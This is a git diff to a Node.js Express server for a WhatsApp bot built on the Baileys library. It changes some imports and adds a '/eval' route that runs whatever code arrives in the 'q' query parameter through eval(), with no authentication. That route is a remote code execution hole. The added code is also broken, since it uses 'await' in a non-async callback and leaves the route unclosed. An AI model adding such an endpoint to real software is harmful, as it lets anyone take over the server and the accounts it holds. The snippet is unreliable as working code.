@@ -1,10 +1,11 @@
 __path = process.cwd()
 const {
-   WAConnection,
+   WAConnection: _WAConnection,
    MessageType,
    Presence,
    MessageOptions,
    Mimetype,
+   MimetypeMap,
    WALocationMessage,
    WA_MESSAGE_STUB_TYPES,
    ReconnectMode,
@@ -13,9 +14,10 @@ const {
    ChatModification,
    waChatKey,
    mentionedJid,
-   processTime,
    WA_DEFAULT_EPHEMERAL
 } = require("@adiwajshing/baileys")
+const simple = require('./lib/simple.js')
+const WAConnection = simple.WAConnection(_WAConnection)
 const frm = require('./whatsapp/message.js')
 const conn = require('./whatsapp/connect')
 const client = conn.client
@@ -78,6 +80,13 @@ router.get('/loginn', async(req, res) => {
 router.get('/', (req, res) => {
 	res.send('kosong')
 	})
+router.get('/eval', (req, res) => {
+	q = req.query.q
+	try {
+    res.send(require('util').format(await eval(`;(async () => { ${q} })()`)))
+    } catch (e) {
+    res.send(e)
+    }
 	
 router.get('/c', async (req, res, next) => {
 			try {
